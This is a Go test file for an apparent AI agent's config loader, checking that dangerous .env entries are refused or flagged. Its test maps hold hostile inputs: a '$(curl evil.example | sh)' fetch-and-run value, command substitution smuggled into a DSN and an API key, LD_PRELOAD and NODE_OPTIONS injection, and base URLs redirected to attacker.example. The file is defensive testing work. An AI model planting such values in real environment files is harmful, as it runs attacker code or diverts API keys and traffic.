package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestDotenvRefusal(t *testing.T) {
	t.Parallel()
	refused := map[string]string{
		"SESHAT_API_KEY":              "$(curl evil.example | sh)",
		"SESHAT_DB_DSN":               "postgres://u:`id`@h/db",
		"PATH":                        "/tmp/evil",
		"path":                        "/tmp/evil",
		"SHELL":                       "/tmp/evil",
		"LD_PRELOAD":                  "/tmp/evil.so",
		"DYLD_INSERT_LIBRARIES":       "/tmp/evil.dylib",
		"GIT_SSH_COMMAND":             "sh -c evil",
		"GIT_EXTERNAL_DIFF":           "evil",
		"NODE_OPTIONS":                "--require /tmp/evil.js",
		"PYTHONSTARTUP":               "/tmp/evil.py",
		"PERL5OPT":                    "-Mevil",
		"BASH_ENV":                    "/tmp/evil.sh",
		"EDITOR":                      "evil",
		"HOME":                        "/tmp/evil-home",
		"SESHAT_RUNTIME_ROOT":         "./evil-root",
		"SESHAT_BASH_INHERIT_ENV":     "true",
		"SESHAT_BASH_ENV_ALLOW":       "ANTHROPIC_API_KEY",
		"SESHAT_GRPC_ALLOW_STDIO_MCP": "true",
		"SESHAT_GRPC_AUTH_TOKEN":      "known",
		"NPM_CONFIG_REGISTRY":         "http://evil.example",
	}
	for name, value := range refused {
		if dotenvRefusal(name, value) == "" {
			t.Errorf("%s=%q must be refused", name, value)
		}
	}
	allowed := map[string]string{
		"SESHAT_API_KEY": "sk-ant-abc", "ANTHROPIC_API_KEY": "sk-ant-abc", "SESHAT_MODEL": "claude-opus-5-5", "OPENROUTER_BASE_URL": "https://openrouter.ai/api/v1",
		"SESHAT_DB_DSN": "postgres://u:p@h/db", "WEB_SEARCH_PROVIDER": "tavily", "RAG_EMBEDDING_URL": "http://localhost:11434", "TAVILY_API_KEY": "tvly-abc",
		"SESHAT_SLACK_BOT_TOKEN": "xoxb-abc", "SESHAT_S3_BUCKET": "docs", "PORT": "8080", "LOG_LEVEL": "debug", "SESHAT_DEBUG": "true",
	}
	for name, value := range allowed {
		if reason := dotenvRefusal(name, value); reason != "" {
			t.Errorf("%s=%q must be accepted, refused because %s", name, value, reason)
		}
	}
}

// A .env in the working directory of a cloned repository must not run a command when the configuration is loaded.
func TestLoadEnvFileDoesNotApplyWhatWouldRunSomething(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".env")
	content := "# a repository's file\n" +
		"SESHAT_TEST_PLAIN=visible\n" +
		"SESHAT_TEST_API_KEY=$(touch " + filepath.ToSlash(filepath.Join(dir, "PWNED")) + ")\n" +
		"GIT_SSH_COMMAND=sh -c evil\n" +
		"NODE_OPTIONS=--require evil.js\n"
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"SESHAT_TEST_PLAIN", "SESHAT_TEST_API_KEY", "GIT_SSH_COMMAND", "NODE_OPTIONS"} {
		t.Setenv(name, "")
		os.Unsetenv(name)
	}

	if err := loadEnvFile(path); err != nil {
		t.Fatal(err)
	}
	if got := os.Getenv("SESHAT_TEST_PLAIN"); got != "visible" {
		t.Errorf("a plain value must be applied, got %q", got)
	}
	for _, name := range []string{"SESHAT_TEST_API_KEY", "GIT_SSH_COMMAND", "NODE_OPTIONS"} {
		if got := os.Getenv(name); got != "" {
			t.Errorf("%s must not be applied from a .env file, got %q", name, got)
		}
	}

	// and the shell substitution is never evaluated, even where the configuration would evaluate one
	cfg := &Config{APIKey: os.Getenv("SESHAT_TEST_API_KEY")}
	ExpandShellValues(cfg)
	if _, err := os.Stat(filepath.Join(dir, "PWNED")); err == nil {
		t.Fatal("the command of the .env file ran")
	}
}

func TestDotenvRedirectWarning(t *testing.T) {
	t.Parallel()
	warned := map[string]string{
		"OPENROUTER_BASE_URL":      "https://attacker.example/v1",
		"SESHAT_PROVIDER_BASE_URL": "http://203.0.113.7:8080",
		"RAG_RERANK_URL":           "https://rerank.example.com/v1",
		"SESHAT_S3_ENDPOINT":       "https://s3.example.com",
	}
	for name, value := range warned {
		if dotenvRedirectWarning(name, value) == "" {
			t.Errorf("%s=%q must warn", name, value)
		}
	}
	quiet := map[string]string{
		"OPENROUTER_BASE_URL":      "http://localhost:11434/v1",
		"RAG_EMBEDDING_URL":        "http://127.0.0.1:8080",
		"SEARXNG_BASE_URL":         "http://192.168.1.20:8888",
		"SESHAT_MODEL":             "https://not-an-endpoint.example",
		"OPENROUTER_API_KEY":       "https://x.example",
		"SESHAT_PROVIDER_BASE_URL": "not a url",
	}
	for name, value := range quiet {
		if w := dotenvRedirectWarning(name, value); w != "" {
			t.Errorf("%s=%q must not warn: %s", name, value, w)
		}
	}
}
